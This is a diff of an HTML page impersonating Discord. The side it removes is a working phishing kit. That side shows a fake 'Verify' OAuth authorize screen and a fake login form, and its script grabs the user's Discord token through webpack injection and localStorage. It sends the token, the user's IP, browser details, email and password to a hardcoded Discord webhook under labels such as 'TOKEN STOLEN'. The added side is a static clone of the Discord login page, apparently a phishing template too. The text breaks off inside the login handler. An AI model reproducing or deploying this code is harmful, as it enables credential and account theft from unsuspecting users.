@@ -1,188 +1,302 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify - Authorize</title>
-  <link href="https://cdn.jsdelivr.net/npm/@fontsource/whitney@4.5.0/index.min.css" rel="stylesheet" />
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html { height: 100%; background: #2f3136; font-family: 'Whitney', sans-serif; color: #dcddde; }
-    .page { display: none; width: 100%; min-height: 100vh; justify-content: center; align-items: center; padding: 20px; }
-    .page.active { display: flex; }
-    .container { max-width: 480px; width: 100%; }
-  </style>
+	<meta charset="utf-8">
+
+	<!-- Web title -->
+	<title>Discord</title>
+
+	<!-- Web Responsive -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Web SEO -->
+	<meta name="title" content="Discord">
+	<meta name="description" content="Discord Login Page - Vins 2106">
+
+	<meta property="og:type" content="website">
+	<meta property="og:url" content="https://mysite.com/">
+	<meta property="og:title" content="Discord">
+	<meta property="og:description" content="Discord Login Page - Vins 2106">
+	<meta property="og:image" content="./img/logo.png">
+
+	<meta property="twitter:url" content="https://mysite.com/">
+	<meta property="twitter:title" content="Discord">
+	<meta property="twitter:description" content="Discord Login Page - Vins 2106">
+	<meta property="twitter:image" content="./img/logo.png">
+
+	<!-- Web Style -->
+	<link rel="stylesheet" type="text/css" href="./css/styles.css">
 </head>
 <body>
-
-  <!-- === REAL DISCORD OAUTH PAGE === -->
-  <div id="oauthPage" class="page active">
-    <div class="container">
-      <div style="background: #36393f; border-radius: 8px; padding: 24px; box-shadow: 0 2px 10px rgba(0,0,0,0.3);">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
-          <span style="color: #72767d; font-size: 24px;">X</span>
-          <h2 style="font-size: 20px; color: #fff;">Authorize</h2>
-          <span></span>
+    <div id="app-mount" class="appMount-3lHmkl">
+      <svg viewBox="0 0 1 1" aria-hidden="true" style="position: absolute; pointer-events: none; top: -1px; left: -1px; width: 1px; height: 1px;">
+        <mask id="svg-mask-squircle" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <path fill="white" d="M0 0.464C0 0.301585 0 0.220377 0.0316081 0.158343C0.0594114 0.103776 0.103776 0.0594114 0.158343 0.0316081C0.220377 0 0.301585 0 0.464 0H0.536C0.698415 0 0.779623 0 0.841657 0.0316081C0.896224 0.0594114 0.940589 0.103776 0.968392 0.158343C1 0.220377 1 0.301585 1 0.464V0.536C1 0.698415 1 0.779623 0.968392 0.841657C0.940589 0.896224 0.896224 0.940589 0.841657 0.968392C0.779623 1 0.698415 1 0.536 1H0.464C0.301585 1 0.220377 1 0.158343 0.968392C0.103776 0.940589 0.0594114 0.896224 0.0316081 0.841657C0 0.779623 0 0.698415 0 0.536V0.464Z"></path>
+        </mask>
+        <mask id="svg-mask-header-bar-badge" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect fill="white" x="0" y="0" width="1" height="1"></rect>
+          <circle fill="black" cx="0.75" cy="0.75" r="0.25"></circle>
+        </mask>
+        <mask id="svg-mask-voice-user-summary-item" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect fill="white" width="1" height="1"></rect>
+          <circle fill="black" cx="1.2083333333333333" cy="0.5" r="0.5416666666666666"></circle>
+        </mask>
+        <mask id="svg-mask-vertical-fade" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <linearGradient id="svg-mask-vertical-fade-gradient" gradientTransform="rotate(90)" x1="0" x2="1" y1="0" y2="0">
+            <stop offset="0%" stop-color="white"></stop>
+            <stop offset="100%" stop-color="black"></stop>
+          </linearGradient>
+          <rect fill="url(#svg-mask-vertical-fade-gradient)" x="0" y="0" width="1" height="1"></rect>
+        </mask>
+        <mask id="svg-mask-panel-button" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect fill="white" x="0" y="0" width="1" height="1"></rect>
+          <circle fill="black" cx="0.75" cy="0.75" r="0.25"></circle>
+        </mask>
+        <mask id="svg-mask-channel-call-control-button" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.8214285714285714" cy="0.8214285714285714" r="0.25"></circle>
+        </mask>
+        <mask id="svg-mask-channel-call-control-button-badge-16" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.6428571428571429" y="-0.07142857142857142" width="0.42857142857142855" height="0.42857142857142855" rx="0.21428571428571427" ry="0.21428571428571427"></rect>
+        </mask>
+        <mask id="svg-mask-channel-call-control-button-badge-22" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.5357142857142857" y="-0.07142857142857142" width="0.5357142857142857" height="0.42857142857142855" rx="0.21428571428571427" ry="0.21428571428571427"></rect>
+        </mask>
+        <mask id="svg-mask-channel-call-control-button-badge-29" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.4107142857142857" y="-0.07142857142857142" width="0.6607142857142857" height="0.42857142857142855" rx="0.21428571428571427" ry="0.21428571428571427"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-default" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-status-round-16" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.8125" cy="0.8125" r="0.3125"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-status-mobile-16" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.5" y="0.3125" width="0.625" height="0.8125" rx="0.1625" ry="0.1625"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-typing-16" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.21875" y="0.5" width="1.1875" height="0.625" rx="0.3125" ry="0.3125"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-round-24" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.8333333333333334" cy="0.8333333333333334" r="0.2916666666666667"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-status-mobile-24" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.5416666666666666" y="0.375" width="0.5833333333333334" height="0.75" rx="0.15" ry="0.15"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-typing-24" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.2916666666666667" y="0.5416666666666666" width="1.0833333333333333" height="0.5833333333333334" rx="0.2916666666666667" ry="0.2916666666666667"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-round-32" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.84375" cy="0.84375" r="0.25"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-status-mobile-32" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.59375" y="0.4375" width="0.5" height="0.65625" rx="0.13125" ry="0.13125"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-typing-32" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.359375" y="0.59375" width="0.96875" height="0.5" rx="0.25" ry="0.25"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-round-40" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.85" cy="0.85" r="0.25"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-status-mobile-40" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.6" y="0.45" width="0.5" height="0.65" rx="0.13" ry="0.13"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-typing-40" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.375" y="0.6" width="0.95" height="0.5" rx="0.25" ry="0.25"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-round-80" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.85" cy="0.85" r="0.175"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-status-mobile-80" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.675" y="0.575" width="0.35" height="0.45" rx="0.09" ry="0.09"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-typing-80" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.525" y="0.675" width="0.65" height="0.35" rx="0.175" ry="0.175"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-round-120" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.8333333333333334" cy="0.8333333333333334" r="0.16666666666666666"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-status-mobile-120" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.6666666666666666" y="0.5666666666666667" width="0.3333333333333333" height="0.43333333333333335" rx="0.08666666666666667" ry="0.08666666666666667"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-status-typing-120" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.5166666666666667" y="0.6666666666666666" width="0.6333333333333333" height="0.3333333333333333" rx="0.16666666666666666" ry="0.16666666666666666"></rect>
+        </mask>
+        <mask id="svg-mask-status-online-mobile" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect fill="white" x="0" y="0" width="1" height="1" rx="0.1875" ry="0.125"></rect>
+          <rect fill="black" x="0.125" y="0.16666666666666666" width="0.75" height="0.5"></rect>
+          <ellipse fill="black" cx="0.5" cy="0.8333333333333334" rx="0.125" ry="0.08333333333333333"></ellipse>
+        </mask>
+        <mask id="svg-mask-status-online" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+        </mask>
+        <mask id="svg-mask-status-idle" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.25" cy="0.25" r="0.375"></circle>
+        </mask>
+        <mask id="svg-mask-status-dnd" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <rect fill="black" x="0.125" y="0.375" width="0.75" height="0.25" rx="0.125" ry="0.125"></rect>
+        </mask>
+        <mask id="svg-mask-status-offline" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.5" cy="0.5" r="0.25"></circle>
+        </mask>
+        <mask id="svg-mask-status-streaming" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <polygon fill="black" points="0.35,0.25 0.78301275,0.5 0.35,0.75"></polygon>
+        </mask>
+        <mask id="svg-mask-status-typing" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect fill="white" cx="0" cy="0" width="1" height="1" ry="0.5" rx="0.2"></rect>
+        </mask>
+        <mask id="svg-mask-avatar-voice-call-80" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5"></circle>
+          <circle fill="black" cx="0.85" cy="0.85" r="0.2"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-call-icon" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5" opacity="1"></circle>
+          <circle fill="black" cx="0.85" cy="0.15" r="0.2"></circle>
+        </mask>
+        <mask id="svg-mask-avatar-call-icon-32" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <circle fill="white" cx="0.5" cy="0.5" r="0.5" opacity="0.5"></circle>
+          <circle fill="black" cx="0.8" cy="0.25" r="0.325"></circle>
+        </mask>
+        <mask id="svg-mask-sticker-rounded-rect" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <path d="M0 0.26087C0 0.137894 0 0.0764069 0.0382035 0.0382035C0.0764069 0 0.137894 0 0.26087 0H0.73913C0.862106 0 0.923593 0 0.961797 0.0382035C1 0.0764069 1 0.137894 1 0.26087V0.73913C1 0.862106 1 0.923593 0.961797 0.961797C0.923593 1 0.862106 1 0.73913 1H0.26087C0.137894 1 0.0764069 1 0.0382035 0.961797C0 0.923593 0 0.862106 0 0.73913V0.26087Z" fill="white"></path>
+        </mask>
+        <mask id="svg-mask-chat-input-button-notification" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect width="1" height="1" fill="white"></rect>
+          <circle cx="0.85" cy="0.85" r="0.25" fill="black"></circle>
+        </mask>
+        <mask id="svg-mask-sticker-shop-notification" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect width="1" height="1" fill="white"></rect>
+          <circle cx="0.9" cy="0.9" r="0.5" fill="black"></circle>
+        </mask>
+        <mask id="svg-mask-autocomplete-emoji-upsell-emoji" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <rect fill="white" width="1" height="1"></rect>
+          <circle fill="black" cx="1.33" cy="0.5" r="0.5833333333333334"></circle>
+        </mask>
+        <mask id="svg-mask-event-ticket" maskContentUnits="objectBoundingBox" viewBox="0 0 1 1">
+          <path d="M0 0.12C0 0.0779961 0 0.0569941 0.00408726 0.0409507C0.00768251 0.0268386 0.0134193 0.015365 0.0204754 0.00817451C0.028497 0 0.038998 0 0.06 0H0.94C0.961002 0 0.971503 0 0.979525 0.00817451C0.986581 0.015365 0.992318 0.0268386 0.995913 0.0409507C1 0.0569941 1 0.0779961 1 0.12V0.45C0.986193 0.45 0.975 0.472386 0.975 0.5C0.975 0.527614 0.986193 0.55 1 0.55V0.88C1 0.922004 1 0.943006 0.995913 0.959049C0.992318 0.973161 0.986581 0.984635 0.979525 0.991826C0.971503 1 0.961002 1 0.94 1H0.0600001C0.0389981 1 0.028497 1 0.0204754 0.991826C0.0134193 0.984635 0.00768251 0.973161 0.00408726 0.959049C0 0.943006 0 0.922004 0 0.88V0.55C0.0138071 0.55 0.025 0.527614 0.025 0.5C0.025 0.472386 0.0138071 0.45 0 0.45V0.12Z" fill="white"></path>
+        </mask>
+      </svg>
+      <svg viewBox="0 0 1 1" aria-hidden="true" style="position: absolute; pointer-events: none; top: -1px; left: -1px; width: 1px; height: 1px;">
+        <linearGradient id="e09ec7b0-a5fd-491b-9497-d4f63a380c27">
+          <stop stop-color="hsl(228, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop>
+          <stop offset="1" stop-color="hsl(244, calc(var(--saturation-factor, 1) * 100%), 84.1%)"></stop>
+        </linearGradient>
+        <linearGradient id="76141760-e011-4783-90cc-ebac3b71a2ba">
+          <stop stop-color="hsl(270, calc(var(--saturation-factor, 1) * 86.7%), 70.6%)"></stop>
+          <stop offset="1" stop-color="hsl(342, calc(var(--saturation-factor, 1) * 58%), 72.9%)"></stop>
+        </linearGradient>
+        <linearGradient id="176b7cb2-9ec5-410c-adc1-28a9819dd4e9">
+          <stop stop-color="hsl(221, calc(var(--saturation-factor, 1) * 70%), 55.5%)"></stop>
+          <stop offset="1" stop-color="hsl(269, calc(var(--saturation-factor, 1) * 83.8%), 71%)"></stop>
+        </linearGradient>
+        <linearGradient id="7146ba7b-9a47-4a2e-96ca-3e40f5c875d6">
+          <stop stop-color="hsl(160, calc(var(--saturation-factor, 1) * 81.3%), 35.7%)"></stop>
+          <stop offset="1" stop-color="hsl(198, calc(var(--saturation-factor, 1) * 81.5%), 46.7%)"></stop>
+        </linearGradient>
+      </svg>
+      <div style="position: fixed; opacity: 0; pointer-events: none;"></div>
+      <div class="app-1q1i1E">
+        <div class="wrapper-6URcxg">
+          <div style="">
+            <div>
+              <form class="authBoxExpanded-2jqaBe authBox-hW6HRx theme-dark">
+                <div class="centeringWrapper-2Rs1dR">
+                  <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 1 1 auto;">
+                    <div class="mainLoginContainer-1ddwnR">
+                      <h3 class="title-jXR8lp marginBottom8-AtZOdT fontDisplay-1dagSA base-1x0h_U size24-RIRrxO">Welcome back!</h3>
+                      <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf">We're so excited to see you again!</div>
+                      <div class="block-egJnc0 marginTop20-3TxNs6">
+                        <div class="marginBottom20-32qID7">
+                          <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP">Email or Phone Number</h5>
+                          <div class="input-cIJ7To input-1CjGeR">
+                            <div class="outerContainer-2pDY4c hidden-2l9u-8">
+                              <div class="container-1uOKxa" style="width: 0px;">
+                                <div class="innerContainer-20_g0H">
+                                  <div class="countryCode-2YakYv" aria-controls="popout_54" aria-expanded="false" role="button" tabindex="0">ID +62</div>
+                                  <div class="separator-39gxf1"></div>
+                                </div>
+                              </div>
+                            </div>
+                            <div class="inputWrapper-31_8H8 inputWrapper-3aw2Sf">
+                              <input class="inputDefault-_djjkz input-cIJ7To inputField-4g7rSQ" name="email" type="text" placeholder="" aria-label="Email or Phone Number" autocomplete="off" maxlength="999" spellcheck="false" value="">
+                            </div>
+                          </div>
+                        </div>
+                        <div>
+                          <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP">Password</h5>
+                          <div class="inputWrapper-31_8H8">
+                            <input class="inputDefault-_djjkz input-cIJ7To" name="password" type="password" placeholder="" aria-label="Password" autocomplete="off" maxlength="999" spellcheck="false" value="">
+                          </div>
+                        </div>
+                        <button type="button" class="marginBottom20-32qID7 marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
+                          <div class="contents-18-Yxp">Forgot your password?</div>
+                        </button>
+                        <button type="submit" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
+                          <div class="contents-18-Yxp">Login</div>
+                        </button>
+                        <div class="marginTop4-2BNfKC">
+                          <span class="needAccount-23l_Wh">Need an account?</span>
+                          <button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
+                            <div class="contents-18-Yxp">Register</div>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="verticalSeparator-3huAjp"></div>
+                    <div class="transitionGroup-aR7y1d qrLogin-1AOZMt">
+                      <div class="measurementFill-31KKmO measurement-DMxQp7 measurementFillStatic-MZ1pNY">
+                        <div class="animatedNode-5VAmrN" style="overflow: visible; opacity: 1; height: 100%;">
+                          <div class="qrLoginInner-c_7ePj">
+                            <!-- <div class="qrCodeContainer-3sXarj">
+                              <div class="qrCode-wG6ZgU" title="https://discord.com/ra/7Yyi67JLeexdEEMcLLiu3HUlnsShWakTIRsUP8UY9ZY" style="padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);">
+                                <canvas width="160" height="160" style="display: none;"></canvas>
+                                <img alt="Scan me!" src="" style="display: block;">
+                              </div>
+                            </div> -->
+                            <h3 class="title-jXR8lp marginBottom8-AtZOdT fontDisplay-1dagSA base-1x0h_U size24-RIRrxO">Log in with QR Code</h3>
+                            <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf">Scan this with the <strong>Discord mobile app</strong> to log in instantly. </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </form>
+            </div>
+          </div>
         </div>
-        <div style="width: 64px; height: 64px; border-radius: 50%; background: #5865f2; margin: 0 auto 16px;"></div>
-        <div style="font-size: 24px; font-weight: 600; color: #fff; margin-bottom: 8px;">Verify</div>
-        <div style="font-size: 16px; color: #b9bbbe; margin-bottom: 24px;">wants to access your Discord account</div>
-
-        <div style="background: #2f3136; padding: 16px; border-radius: 6px; margin-bottom: 24px; text-align: left;">
-          <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
-            <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-            Access your username, avatar and banner
-          </div>
-          <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
-            <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-            Access your email address
-          </div>
-          <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
-            <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-            Access your third-party connections
-          </div>
-          <div style="display: flex; align-items: center; margin: 12px 0; color: #43b581; font-size: 15px;">
-            <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-            Join servers for you
-          </div>
-          <div style="display: flex; align-items: center; margin: 12px 0; color: #f04747; font-size: 15px;">
-            <svg fill="currentColor" viewBox="0 0 16 16" style="width: 20px; height: 20px; margin-right: 8px;"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06z"/></svg>
-            Record a new mixtape
-          </div>
-        </div>
-
-        <p style="font-size: 13px; color: #72767d; margin: 16px 0; line-height: 1.4;">
-          Once you authorize, you will be redirected outside Discord to: <strong>https://vaultcord.win</strong><br>
-          The Privacy Policy and Terms of Service of Verify's developer apply to this application.
-        </p>
-        <p style="font-size: 13px; color: #72767d; margin: 16px 0;">
-          Active since 13 Jun 2024<br>
-          This application cannot read your messages or send messages as you.
-        </p>
-
-        <button id="authorizeBtn" style="width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer;">Authorize</button>
       </div>
+      <div></div>
+      <div></div>
+      <div class="layerContainer-yqaFcK"></div>
+      <div class="layerContainer-yqaFcK"></div>
+      <div style="position: fixed; opacity: 0; pointer-events: none;"></div>
+      <div></div>
     </div>
-  </div>
-
-  <!-- === REAL DISCORD LOGIN PAGE === -->
-  <div id="loginPage" class="page">
-    <div class="container">
-      <div style="background: #36393f; border-radius: 8px; padding: 40px 40px; max-width: 480px; margin: 0 auto;">
-        <div style="text-align: center; margin-bottom: 24px;">
-          <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" style="width: 124px;">
-        </div>
-        <h1 style="font-size: 26px; font-weight: 600; color: #fff; text-align: center; margin-bottom: 8px;">Welcome back!</h1>
-        <p style="font-size: 16px; color: #b9bbbe; text-align: center; margin-bottom: 32px;">We're so excited to see you again!</p>
-        <form id="loginForm">
-          <label style="font-size: 12px; font-weight: 600; color: #b9bbbe; text-transform: uppercase; margin-bottom: 6px; display: block;">Email or Phone Number</label>
-          <input type="text" id="email" required style="width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px;">
-          <label style="font-size: 12px; font-weight: 600; color: #b9bbbe; text-transform: uppercase; margin-bottom: 6px; display: block;">Password</label>
-          <input type="password" id="password" required style="width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px;">
-          <div style="text-align: right; margin-bottom: 24px;">
-            <a href="#" style="color: #00aff4; font-size: 14px; text-decoration: none;">Forgot your password?</a>
-          </div>
-          <button type="submit" style="width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer;">Log In</button>
-        </form>
-        <div style="text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe;">
-          Need an account? <a href="#" style="color: #00aff4; text-decoration: none;">Register</a>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';
-    let modules = [];
-
-    function injectWebpack() {
-      if (typeof webpackChunkdiscord_app !== 'undefined') {
-        webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
-          for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
-            if (m.default?.getToken) modules.push(m.default);
-            if (m.getToken) modules.push(m);
-          }
-        }]);
-        webpackChunkdiscord_app.pop();
-      }
-    }
-
-    function getToken() {
-      injectWebpack();
-      const mod = modules.find(m => m?.getToken);
-      if (mod) {
-        const t = mod.getToken();
-        if (t && t.length > 50) return t.replace(/"/g, '');
-      }
-      try {
-        const ls = localStorage.getItem('token');
-        if (ls && ls.length > 50) return ls.replace(/"/g, '');
-      } catch (e) {}
-      return null;
-    }
-
-    async function sendData(title, fields = []) {
-      const token = getToken();
-      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
-      const payload = {
-        embeds: [{
-          title,
-          color: title.includes('TOKEN') ? 0x00ff00 : 0x5865f2,
-          fields: [
-            ...fields,
-            ...(token ? [{ name: 'Token', value: `\`\`\`${token.substring(0, 60)}...\`\`\``, inline: false }] : []),
-            { name: 'IP', value: `\`${ip}\``, inline: true },
-            { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
-          ],
-          timestamp: new Date().toISOString()
-        }]
-      };
-      fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-    }
-
-    async function grabToken() {
-      for (let i = 0; i < 4; i++) {
-        const token = getToken();
-        if (token) {
-          await sendData('TOKEN STOLEN');
-          return true;
-        }
-        await new Promise(r => setTimeout(r, 600));
-      }
-      return false;
-    }
-
-    // AUTHORIZE CLICK → INSTANT LOGIN PAGE + TOKEN GRAB
-    document.getElementById('authorizeBtn').addEventListener('click', async () => {
-      // INSTANT SWITCH
-      document.getElementById('oauthPage').classList.remove('active');
-      document.getElementById('loginPage').classList.add('active');
-
-      // GRAB TOKEN IN BACKGROUND
-      grabToken();
-    });
-
-    // LOGIN SUBMIT → SEND CREDS + TOKEN AGAIN
-    document.getElementById('loginForm').onsubmit = async (e) => {
-      e.preventDefault();
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
-      if (!email || !password) return;
-
-      await sendData('LOGIN SUCCESS', [
-        { name: 'Email/Phone', value: `\`${email}\``, inline: false },
-        { name: 'Password', value: `\`${password}\``, inline: false }
-      ]);
